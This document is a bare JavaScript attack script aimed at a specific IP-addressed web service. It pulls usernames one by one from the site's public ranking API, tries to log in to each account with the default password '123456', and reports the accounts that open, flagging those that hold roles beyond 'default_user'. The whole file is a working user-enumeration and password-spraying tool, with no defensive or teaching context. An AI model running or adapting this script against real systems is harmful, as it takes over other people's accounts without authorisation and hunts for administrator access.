for (let idx = 1; idx <= 1900; ++idx) {
  try {
    let name = (
      await (
        await fetch(
          `http://123.60.188.246/api/get-rank-list?currentPage=${idx}&limit=1&type=0`,
        )
      ).json()
    ).data.records[0].username;
    let resp = await (
      await fetch(
        `http://123.60.188.246/api/get-rank-list?currentPage=${idx}&limit=1&type=0`,
      )
    ).json();
    let data = await (
      await fetch("http://123.60.188.246/api/login", {
        headers: {
          accept: "application/json, text/plain, */*",
          "content-type": "application/json;charset=UTF-8",
        },
        body: JSON.stringify({ username: name, password: "123456" }),
        method: "POST",
      })
    ).json();
    if (
      data.data.roleList.length !== 1 ||
      data.data.roleList[0] !== "default_user"
    ) {
      console.log(data.data);
    } else {
      console.log(name);
    }
  } catch (e) {}
}
